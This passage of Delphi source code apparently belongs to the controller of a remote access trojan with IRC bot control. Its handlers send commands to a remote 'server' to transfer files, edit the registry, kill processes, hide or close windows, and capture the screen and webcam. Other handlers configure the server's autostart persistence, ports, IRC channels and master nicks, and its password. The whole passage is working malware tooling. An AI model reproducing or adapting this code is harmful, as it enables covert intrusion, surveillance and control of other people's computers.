procedure TForm6.FormClose(Sender: TObject; var Action: TCloseAction);
var
  kill:dword;
begin
  Caption:= '-';
  CloseSocket(Sock);
  Shutdown(Sock,2);
  CloseSocket(Sock2);
  Shutdown(Sock2,2);
  GetExitCodeThread(upload_handle,kill);
  TerminateThread(upload_handle,kill);
end;

procedure TForm6.addfiles(name:String;S:integer);
var
 us:TlistItem;
begin
 us := ListView2.Items.Add;
 us.Caption := upload_ip;
 us.SubItems.Add(name);
 us.SubItems.Add('0%');
 us.SubItems.Add('0');
 if s = 1 then
  us.SubItems.Add('U')
 else
  us.SubItems.Add('D');
end;

procedure TForm6.Button11Click(Sender: TObject);
var
 US:TListItem;
 str:String;
 i:integer;
begin
 if OpenDialog1.Execute then begin
   Upload_IP := statusbar1.Panels[0].Text;
   sending := true;
   Upload := true;
  if listview2.items.Count = 0 then begin
   if opendialog1.Files.Count > 1 then begin
    for i:=0 to opendialog1.Files.Count -1 do
     addfiles(opendialog1.Files.Strings[i],1);
   end else begin
     addfiles(opendialog1.FileName,1);
   end;
  end else begin
   if opendialog1.Files.Count > 1 then begin
    for i:=0 to opendialog1.Files.Count -1 do
     addfiles(opendialog1.Files.Strings[i],1);
   end else begin
     addfiles(opendialog1.FileName,1);
   end;
  end;
  sendstr('20'+#13);
  connected;
  Upload_Name := listview2.Items[0].SubItems[0];
  Upload_Progress := 1;
  UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
  pagecontrol1.ActivePageIndex := 1;
 end;
end;

procedure TForm6.addf(name:String;size:string;fdir:String;icon:integer);
var
 us:tlistitem;
begin
 us := listview5.Items.Add;
 us.Caption := name;
 us.SubItems.Add(size);
 us.SubItems.Add(fdir);
 us.ImageIndex := icon;
end;

procedure TForm6.Timer2Timer(Sender: TObject);
var
  DIRL:TEXTFILE;DIR1,DIR2,DIR:STRING;
  SIZE:STRING;NAME:STRING;FDIR:STRING;
  PATH:STRING;
begin
// set info
if listview2.Items.Count = 0 then exit;

if not sending then begin
IF REGKEYS THEN BEGIN
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
 AssignFILE(DIRL,UPLOAD_NAME);
 RESET(DIRL);
 READ(DIRL, DIR1);
 READLN(DIRL, DIR2);
 DIR := DECRYPT(DIR1);
 NAME := DIR;
 IF (NAME<>'..') AND (NAME<>'.') THEN BEGIN
   ADDITEM(RegView,Name,'','','','');
 END;
 WHILE NOT EOF(DIRL) DO BEGIN
  READ(DIRL, DIR1);
  READLN(DIRL, DIR2);
  DIR := DECRYPT(DIR1);
  NAME := DIR;
  IF (NAME<>'..') AND (NAME<>'.') THEN BEGIN
    ADDITEM(RegView,Name,'','','','');
  END;
 END;
 CLOSEFILE(DIRL);
 REGKEYS := FALSE;
  SENDSTR('20'+#13);
  CONNECTED;
  SendStr('54'+ExtractHkey(label19.Caption)+chr(0160)+Path+#13);
  Connected;
END;
IF REGVALUS THEN BEGIN
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
 AssignFILE(DIRL,UPLOAD_NAME);
 RESET(DIRL);
 READ(DIRL, DIR1);
 READLN(DIRL, DIR2);
 DIR := DECRYPT(DIR1);
 NAME := COPY(DIR, 1, POS(CHR(0160),DIR)-1);
 SIZE := COPY(DIR, POS(CHR(0160),DIR)+1, LENGTH(DIR));
 IF (NAME<>'..') AND (NAME<>'.') THEN BEGIN
   ADDITEM(RegValues,Name,Size,'','','');
 END;
 WHILE NOT EOF(DIRL) DO BEGIN
  READ(DIRL, DIR1);
  READLN(DIRL, DIR2);
  DIR := DECRYPT(DIR1);
  NAME := COPY(DIR, 1, POS(CHR(0160),DIR)-1);
  SIZE := COPY(DIR, POS(CHR(0160),DIR)+1, LENGTH(DIR));
  IF (NAME<>'..') AND (NAME<>'.') THEN BEGIN
    ADDITEM(RegValues,Name,Size,'','','');
  END;
 END;
 CLOSEFILE(DIRL);
 REGVALUS := FALSE;
END;
IF DIRLIST THEN BEGIN
 AssignFILE(DIRL,UPLOAD_NAME);
 RESET(DIRL);
 READ(DIRL, DIR1);
 READLN(DIRL, DIR2);
 DIR := DECRYPT(DIR1);
 LABEL16.Caption := DIR;
 WHILE NOT EOF(DIRL) DO BEGIN
  READ(DIRL, DIR1);
  READLN(DIRL, DIR2);
  DIR := DECRYPT(DIR1);
  NAME := COPY(DIR, 1, POS(';',DIR)-1);
  SIZE := COPY(DIR, POS(';',DIR)+1, LENGTH(DIR));
  FDIR := COPY(SIZE,POS(';',SIZE)+1,LENGTH(SIZE));
  SIZE := COPY(SIZE, 1, POS(';',SIZE)-1);
  IF (NAME<>'..') AND (NAME<>'.') THEN BEGIN
   IF NAME[LENGTH(NAME)] = '\' THEN
     ADDF(NAME,SIZE,FDIR,0);
  END;
 END;
 CLOSEFILE(DIRL);
 AssignFILE(DIRL,UPLOAD_NAME);
 RESET(DIRL);
 READ(DIRL, DIR1);
 READLN(DIRL, DIR2);
 DIR := DECRYPT(DIR1);
 LABEL16.Caption := DIR;
 WHILE NOT EOF(DIRL) DO BEGIN
  READ(DIRL, DIR1);
  READLN(DIRL, DIR2);
  DIR := DECRYPT(DIR1);
  NAME := COPY(DIR, 1, POS(';',DIR)-1);
  SIZE := COPY(DIR, POS(';',DIR)+1, LENGTH(DIR));
  FDIR := COPY(SIZE,POS(';',SIZE)+1,LENGTH(SIZE));
  SIZE := COPY(SIZE, 1, POS(';',SIZE)-1);
  IF (NAME<>'..') AND (NAME<>'.') THEN BEGIN
   IF NAME[LENGTH(NAME)] <> '\' THEN
    ADDF(NAME,SIZE,FDIR,1);
  END;
 END;
 CLOSEFILE(DIRL);
 DIRLIST := FALSE;
END;
End;
 listview2.items[0].Delete;
 if listview2.Items.Count > 0 then begin
  Sleep(200);
  sending := true;
  Upload_Name := listview2.Items[0].SubItems[0];
  Upload_Progress := 1;
  Upload_IP := statusbar1.Panels[0].Text;
  if listview2.Items[0].SubItems[3] = 'U' then upload := true else upload := false;
  UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
 end else upload_progress := 0;
end;

procedure TForm6.Timer3Timer(Sender: TObject);
begin
 if sending then begin
  IF UPLOAD THEN BEGIN
   if listview2.Items.Count > 0 then
    listview2.Items[0].SubItems[1] := inttostr(upload_done)+'%';
   statusbar1.Panels[3].Text := inttostr(upload_done)+'%';
   if listview2.Items.Count > 0 then
    listview2.Items[0].SubItems[2] := inttostr(BytesDone);
   statusbar1.Panels[2].Text := 'Transfer '+inttostr(bytesread)+' Byte';
  END ELSE BEGIN
   if listview2.Items.Count > 0 then
    listview2.Items[0].SubItems[1] := inttostr(upload_done)+'%';
    statusbar1.Panels[3].Text := inttostr(upload_done)+'%';
   if listview2.Items.Count > 0 then
    listview2.Items[0].SubItems[2] := inttostr(BytesDone);
    statusbar1.Panels[2].Text := 'Transfer '+inttostr(byteswritten)+' Byte';
  END;
 end
   else begin
    Upload_Done := 0;
    BytesDone := 0;
    BytesRead := 0;
    BytesWritten := 0;
    statusbar1.Panels[3].Text := '100%';
    statusbar1.Panels[2].Text := 'Transfer 0 Byte';
   end;
end;

procedure TForm6.Button5Click(Sender: TObject);
begin
if listview2.ItemIndex = -1 then exit;
if listview2.ItemIndex = 0 then begin
 sending := false;
 upload_done := 0;
 bytesdone := 0;
 bytesread := 0;
 listview2.items[0].Delete;
 sendstr(inttostr(TRANSFER_CANCEL)+#13);
 exit;
end else
listview2.items[listview2.ItemIndex].Delete;
end;

procedure TForm6.Button12Click(Sender: TObject);
begin
if listVIEW5.ItemIndex = -1 then exit;
IF LISTVIEW5.Items[listVIEW5.ItemIndex].ImageIndex = 0 THEN EXIT;
if listview2.Items.Count = 0 then begin
sendstr('20'+#13);
connected;
Upload_IP := statusbar1.Panels[0].Text;
pagecontrol1.ActivePageIndex := 1;
UPLOAD_PROGRESS := 1;
sending := true;
upload := false;
upload_name := LISTVIEW5.Items[listVIEW5.ItemIndex].SubItems[1]+LISTVIEW5.Items[listVIEW5.ItemIndex].Caption;
addfiles(LISTVIEW5.Items[listVIEW5.ItemIndex].SubItems[1]+LISTVIEW5.Items[listVIEW5.ItemIndex].Caption,0);
UPLOAD_HANDLE := CreateThread(nil,0,@SendF,nil,0,Upload_word);
end else
addfiles(LISTVIEW5.Items[listVIEW5.ItemIndex].SubItems[1]+LISTVIEW5.Items[listVIEW5.ItemIndex].Caption,0);
end;

procedure TForm6.Button7Click(Sender: TObject);
var
 dir:string;
begin
SENDSTR('20'+#13);
CONNECTED;
dir := label16.caption;
LISTVIEW5.ITEMS.CLEAR;
SENDSTR('16'+label16.caption+#13);
CONNECTED;
end;

procedure TForm6.Button6Click(Sender: TObject);
begin
SENDSTR('15'+#13);
CONNECTED;
end;

procedure TForm6.ListView5DblClick(Sender: TObject);
begin
if listview5.ItemIndex = -1 then exit;
if listview5.Items[listview5.itemindex].ImageIndex = 0 then begin
 if (listview5.Items[listview5.itemindex].Caption = '..\') or
    (listview5.Items[listview5.itemindex].Caption = '.\') then begin
  label16.Caption := copy(label16.caption,1,length(label16.caption)-1);
  label16.caption := extractfilepath(label16.caption);
 end else begin
  label16.caption := label16.caption + listview5.Items[listview5.itemindex].Caption;
 end;
 LISTVIEW5.Clear;
 SENDSTR('16'+label16.caption+#13);
 CONNECTED;
end else begin
 button12click(self);
end;
end;

procedure TForm6.Button8Click(Sender: TObject);
begin
if listview5.ItemIndex = -1 then exit;
if listview5.Items[listview5.itemindex].ImageIndex = 0 then exit;
sendstr('17'+LABEL16.CAPTION+listview5.Items[listview5.itemindex].caption+#13);
end;

procedure TForm6.Button9Click(Sender: TObject);
begin
if listview5.ItemIndex = -1 then exit;
if listview5.Items[listview5.itemindex].ImageIndex = 1 then exit;
sendstr('18'+LABEL16.CAPTION+listview5.Items[listview5.itemindex].caption+#13);
end;

procedure TForm6.Button10Click(Sender: TObject);
begin
if listview5.ItemIndex = -1 then exit;
if listview5.Items[listview5.itemindex].ImageIndex = 0 then exit;
sendstr('19'+LABEL16.CAPTION+listview5.Items[listview5.itemindex].caption+#13);
end;

procedure TForm6.ComboBox1Change(Sender: TObject);
begin
LABEL16.CAPTION := COMBOBOX1.TEXT;
end;

procedure TForm6.Button4Click(Sender: TObject);
begin
Listview1.Items.Clear;
sleep(100);
sendstr(inttostr(INFO_SERVER)+#13);
connected;
end;

procedure TForm6.Button13Click(Sender: TObject);
begin
Listview3.Items.Clear;
sleep(100);
sendstr(inttostr(PROCESS_REFRESH)+#13);
connected;
end;

procedure TForm6.Button14Click(Sender: TObject);
begin
if listview3.ItemIndex = -1 then exit;
sendstr(inttostr(PROCESS_KILL)+listview3.Items[listview3.ItemIndex].caption+#13);
button13click(self);
end;

procedure TForm6.RichEdit1KeyPress(Sender: TObject; var Key: Char);
begin
 if (key = '@') or (key = '.') or
    (key = ',') or (key = '*') or
    (key = ';') or (key = ':') or
    (key = '/') or (key = '\') or
    (key = '(') or (key = ')') or
    (key = '[') or (key = ']') or
    (key = '0') or (key = '1') or (key = '2') or (key = '3') or (key = '4') or
    (key = '5') or (key = '6') or (key = '7') or (key = '8') or (key = '9') or
    (key = '<') or (key = '>') then begin
  richedit1.SelAttributes.Color := clred;
  richedit1.SelText := richedit1.SelText + key;
  richedit1.SelAttributes.Color := $004D4D53;
  zeromemory(@key, length(key));
 end else richedit2.SelAttributes.Color := $004D4D53;
end;

procedure TForm6.RichEdit2KeyPress(Sender: TObject; var Key: Char);
begin
 if (key = '@') or (key = '.') or
    (key = ',') or (key = '*') or
    (key = ';') or (key = ':') or
    (key = '/') or (key = '\') or
    (key = '(') or (key = ')') or
    (key = '[') or (key = ']') or
    (key = '0') or (key = '1') or (key = '2') or (key = '3') or (key = '4') or
    (key = '5') or (key = '6') or (key = '7') or (key = '8') or (key = '9') or
    (key = '<') or (key = '>') then begin
  richedit2.SelAttributes.Color := clred;
  richedit2.SelText := richedit2.SelText + key;
  richedit2.SelAttributes.Color := $004D4D53;
  zeromemory(@key, length(key));
 end else richedit2.SelAttributes.Color := $004D4D53;
end;

procedure TForm6.RichEdit2Change(Sender: TObject);
begin
if startup then exit;
try
 richedit2.Lines.SaveToFile(extractfilepath(paramstr(0))+'\registry.edt');
except
 exit;
end;
end;

procedure TForm6.Button24Click(Sender: TObject);
var
 i:integer;
 a:dword;
begin
if strtoint(edit21.text)>9 then edit21.text := '9';
if strtoint(edit21.text)<1 then edit21.text := '1';
sendstr('20'+#13);
connected;
 IF RadioButton5.Checked then
  sendstr('51'+edit21.text+#13)
 else
  sendstr('50'+edit21.text+#13);
connected;
end;

procedure TForm6.Timer4Timer(Sender: TObject);
var
PNG:TPNGObject;
FF:string;
I:Integer;
begin
IF SCREEN or WEBCAM THEN BEGIN
Image1.Picture.Bitmap.FreeImage;
Image1.Refresh;
Image1.Repaint;
Image1.Update;
Image1.Visible := False;
i:=0;
IF SAVE THEN
FF := ExtractFilePath(Paramstr(0))+'IMAGES\'
ELSE
FF := ExtractFilePath(Paramstr(0));

IF SAVE THEN BEGIN
if RadioButton5.Checked then BEGIN
 While FileExists(FF + 'SCREEN'+inttostr(i)+'.PNG') Do
  Inc(I);
end ELSE begin
 While FileExists(FF + 'WEBCAM'+inttostr(i)+'.PNG') Do
  Inc(I);
end;
if RadioButton5.Checked then
 FF := FF + 'SCREEN'+inttostr(i-1)+'.PNG'
ELSE
 FF := FF + 'WEBCAM'+inttostr(i-1)+'.PNG';
END ELSE
if RadioButton5.Checked then
 FF := FF + 'SCREEN.PNG'
else
 FF := FF + 'WEBCAM.PNG';
try
PNG:=TPNGObject.Create;
PNG.LoadFromFile(FF);
except
SCREEN := FALSE;
WEBCAM := FALSE;
IF Screen_Stream then begin
 i:=0;
 image1.update;
 image1.refresh;
 timer_screen.Enabled := true;
end;
exit;
end;
Image1.Picture.Bitmap.FreeImage;
Image1.Refresh;
Image1.Repaint;
Image1.Update;
sleep(500);
Image1.Picture.Assign(PNG);
Image1.Refresh;
Image1.Repaint;
Image1.Update;
sleep(500);
PNG.Free;
SCREEN := FALSE;
WEBCAM := FALSE;
IF Screen_Stream then begin
 i:=0;
 image1.update;
 image1.refresh;
 timer_screen.Enabled := true;
end;
Sleep(300);
Image1.Visible := True;
END;
end;

procedure TForm6.CheckBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox1.Checked then SAVE := true else SAVE := false;
end;

procedure TForm6.Button25Click(Sender: TObject);
begin
Screen_Stream := True;
Button24Click(self);
end;

procedure TForm6.Button26Click(Sender: TObject);
begin
Screen_Stream := False;
end;

procedure TForm6.CheckBox2MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox1.Checked then SAVE := true else SAVE := false;
end;

procedure TForm6.Button29Click(Sender: TObject);
var
 Path:String;
begin
If Edit16.Text = '' Then Exit;
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SendStr('57'+ExtractHkey(label19.Caption)+chr(0160)+Path+chr(0160)+Edit16.Text+Chr(0160)+Edit15.text+#13);
  Sleep(100);
  Button33click(self);
end;

procedure TForm6.Button28Click(Sender: TObject);
var
 Path:string;
begin
If RegView.ItemIndex <> -1 then begin
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SendStr('55'+ExtractHkey(label19.Caption)+chr(0160)+Path+chr(0160)+regview.items[regview.itemindex].caption+#13);
  Sleep(100);  
  Button33click(self);
end else If RegValues.ItemIndex <> -1 then begin
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SendStr('55'+ExtractHkey(label19.Caption)+chr(0160)+Path+chr(0160)+RegValues.items[RegValues.itemindex].caption+#13);
  Sleep(100);
  Button33click(self);
end;
end;

procedure TForm6.Button27Click(Sender: TObject);
var
 Path:string;
begin
If RegValues.ItemIndex = -1 then exit;
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SendStr('56'+ExtractHkey(label19.Caption)+chr(0160)+Path+chr(0160)+RegValues.items[RegValues.itemindex].caption+#13);
  Sleep(100);
  Button33click(self);
end;

procedure TForm6.Button15Click(Sender: TObject);
begin
if listview4.ItemIndex = -1 then exit;
sendstr(inttostr(WIN_CAPTION)+Listview4.Items[listview4.ItemIndex].Caption+';'+edit19.text+#13);
sleep(200);
button3click(self);
end;

procedure TForm6.Button3Click(Sender: TObject);
begin
Listview4.items.Clear;
sendstr(inttostr(WIN_REFRESH)+#13);
connected;
end;

procedure TForm6.Button16Click(Sender: TObject);
begin
if listview4.ItemIndex = -1 then exit;
sendstr(inttostr(WIN_HIDE)+Listview4.Items[listview4.ItemIndex].Caption+#13);
end;

procedure TForm6.Button17Click(Sender: TObject);
begin
if listview4.ItemIndex = -1 then exit;
sendstr(inttostr(WIN_SHOW)+Listview4.Items[listview4.ItemIndex].Caption+#13);
end;

procedure TForm6.Button18Click(Sender: TObject);
begin
if listview4.ItemIndex = -1 then exit;
sendstr(inttostr(WIN_CLOSE)+Listview4.Items[listview4.ItemIndex].Caption+#13);
end;

procedure TForm6.Button20Click(Sender: TObject);
begin
SendStr(inttostr(SERV_SETTINGS)+#13);
Connected;
end;

procedure TForm6.Button22Click(Sender: TObject);
begin
SendStr(inttostr(IRC_SETTINGS)+#13);
Connected;
end;

procedure TForm6.Button19Click(Sender: TObject);
var
 Traffic_port : integer;
 Transfer_port : integer;
 Autostart : integer;
 Key, Value, Exename : String;
 Str : String;
begin

 Traffic_Port := StrToInt(Edit1.text);
 Transfer_Port := StrToInt(Edit2.text);

 If Traffic_port > BUFLEN then exit;
 If Transfer_port > BUFLEN then exit;
 If Traffic_port < 1 then exit;
 If Transfer_port < 1 then exit;

 If radiobutton1.Checked then Autostart := 1; {System}
 If radiobutton2.Checked then Autostart := 2; {Win}
 If radiobutton3.Checked then Autostart := 3; {Regedit}
 If radiobutton4.Checked then Autostart := 4; {None}

 Str := IntToStr(SERV_TRAFFICP)+inttostr(Traffic_port);
 SendStr(str+#13);
 Connected;
 Str := IntToStr(SERV_TRANSP)+inttostr(Transfer_port);
 SendStr(str+#13);
 Connected;
 Str := IntToStr(SERV_AUTOSTART)+inttostr(Autostart);
 SendStr(str+#13);
 Connected;

Case Autostart Of
 1:begin
    Str := IntToStr(SERV_SYSNAME)+Edit6.text;
    SendStr(str+#13);
    Connected;
   end;
 2:begin
    Str := IntToStr(SERV_WINNAME)+Edit5.text;
    SendStr(str+#13);
    Connected;
   end;
 3:begin
    Str := IntToStr(SERV_REGKEY)+Edit3.text;
    SendStr(str+#13);
    Connected;
    Str := IntToStr(SERV_REGVALUE)+Edit4.text;
    SendStr(str+#13);
    Connected;
   end;
end;

end;

procedure TForm6.Button21Click(Sender: TObject);
var
 nick1,nick2,chan1,chan2,
 serv1,serv2,key1,key2,
 master1,master2 : string;
begin
 Nick1 := Edit8.text;
 Nick2 := Edit7.text;
 Chan1 := Edit9.text;
 Chan2 := Edit10.text;
 serv1 := edit11.text;
 serv2 := edit12.text;
 key1  := edit13.text;
 key2  := edit14.text;

IF nick1 <> '' then begin
 SendStr(IntToStr(IRC_NICK1)+Nick1+#13);
 Connected;
end;
IF nick2 <> '' then begin
 SendStr(IntToStr(IRC_NICK2)+Nick2+#13);
 Connected;
end;

IF Chan1 <> '' then begin
 SendStr(IntToStr(IRC_Chan1)+Chan1+#13);
 Connected;
end;
IF chan2 <> '' then begin
 SendStr(IntToStr(IRC_Chan2)+Chan2+#13);
 Connected;
end;

IF Serv1 <> '' then begin
 SendStr(IntToStr(IRC_SERV1)+SERV1+#13);
 Connected;
end;
IF Serv2 <> '' then begin
 SendStr(IntToStr(IRC_SERV2)+SERV2+#13);
 Connected;
end;

IF KEY1 <> '' then begin
 SendStr(IntToStr(IRC_CKEY1)+KEY1+#13);
 Connected;
end;
IF KEY2 <> '' then begin
 SendStr(IntToStr(IRC_CKEY2)+KEY2+#13);
 Connected;
end;

IF MASTER1 <> '' then begin
 SendStr(IntToStr(IRC_MASTER1)+MASTER1+#13);
 Connected;
end;
IF MASTER2 <> '' then begin
 SendStr(IntToStr(IRC_MASTER2)+MASTER2+#13);
 Connected;
end;

end;

procedure TForm6.FormConstrainedResize(Sender: TObject; var MinWidth,
  MinHeight, MaxWidth, MaxHeight: Integer);
begin
minwidth  := 313;
minheight := 292;
end;

procedure TForm6.timer_screenTimer(Sender: TObject);
begin
button24click(self);
timer_screen.Enabled := false;
end;

procedure TForm6.Button23Click(Sender: TObject);
label err;
begin

 if edit17.text = '' then goto err;
 if edit18.Text = '' then goto err;
 if pos(chr(0160),edit17.Text)>0 then goto err;
 if pos(chr(0160),edit18.Text)>0 then goto err;

 SendStr(IntToStr(PASSWORD_SAVE)+edit17.text+chr(0160)+edit18.text+#13);
 Connected;
 exit;
err:
 MessageBox(0,'Illegal or empty password','Error',mb_ok);
end;

procedure TForm6.Edit25KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
if key = 13 then begin
 SendStr('PASS:'+Edit25.text+#13);
 Connected;
 ZeroMemory(@key,length(inttostr(key)));
end;
end;

procedure TForm6.Button30Click(Sender: TObject);
begin
SendSTR(inttostr(serv_cgi)+edit23.text+#13);
end;

procedure TForm6.Button31Click(Sender: TObject);
begin
SendSTR(inttostr(serv_php)+edit24.text+#13);
end;

procedure TForm6.Button32Click(Sender: TObject);
begin
SendStr(inttostr(52)+#13);
DEAD := TRUE;
end;

procedure TForm6.RegViewDblClick(Sender: TObject);
var
 S:String;
 Path:String;
 US:TListItem;
begin
 If RegView.ItemIndex = -1 Then Exit;
 S := RegView.Items[RegView.ItemIndex].Caption;
 IF Label19.caption = 'ROOT\' Then
  Label19.caption := '';
 IF S = '..' Then begin
  If (Label19.caption = 'HKEY_CLASSES_ROOT\') or
     (Label19.caption = 'HKEY_CURRENT_USER\') or
     (Label19.caption = 'HKEY_LOCAL_MACHINE\') or
     (Label19.caption = 'HKEY_USERS\') or
     (Label19.caption = 'HKEY_CURRENT_CONFIG\') then begin
     RegView.Items.Clear;
     RegValues.Items.Clear;
     US := RegView.Items.Add;
     US.Caption := 'HKEY_CLASSES_ROOT';
     US := RegView.Items.Add;
     US.Caption := 'HKEY_CURRENT_USER';
     US := RegView.Items.Add;
     US.Caption := 'HKEY_LOCAL_MACHINE';
     US := RegView.Items.Add;
     US.Caption := 'HKEY_USERS';
     US := RegView.Items.Add;
     US.Caption := 'HKEY_CURRENT_CONFIG';
     Label19.caption := 'ROOT\';
   exit;
  end;
  Label19.caption := Copy(Label19.caption,1,length(Label19.caption)-1);
  Label19.caption := ExtractFilePath(Label19.caption);
  RegView.Items.Clear;
  RegValues.Items.Clear;
  US := RegView.Items.Add;
  US.Caption := '..';  
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SENDSTR('20'+#13);
  CONNECTED;
  SendStr('53'+ExtractHkey(label19.Caption)+chr(0160)+Path+#13);
  Connected;
 end else begin
  Label19.caption := Label19.caption +S+'\';
  RegView.Items.Clear;
  RegValues.Items.Clear;
  US := RegView.Items.Add;
  US.Caption := '..';
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SENDSTR('20'+#13);
  CONNECTED;
  SendStr('53'+ExtractHkey(label19.Caption)+chr(0160)+Path+#13);
  Connected;
 end;
end;

procedure TForm6.Button33Click(Sender: TObject);
var
 US:TListItem;
 Path:string;
begin
If Label16.caption = 'ROOT\' then exit;
  RegView.Items.Clear;
  RegValues.Items.Clear;
  US := RegView.Items.Add;
  US.Caption := '..';
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SENDSTR('20'+#13);
  CONNECTED;
  Path:= Copy(Label19.caption, pos('\',label19.caption)+1,length(label19.caption));
  Path := Copy(Path,1,length(path)-1);
  SendStr('53'+ExtractHkey(label19.Caption)+chr(0160)+Path+#13);
  Connected;
end;

procedure TForm6.RegValuesClick(Sender: TObject);
begin
If RegValues.ItemIndex = -1 Then Exit;
Edit16.Text := RegValues.items[RegValues.ItemIndex].Caption;
end;

end.
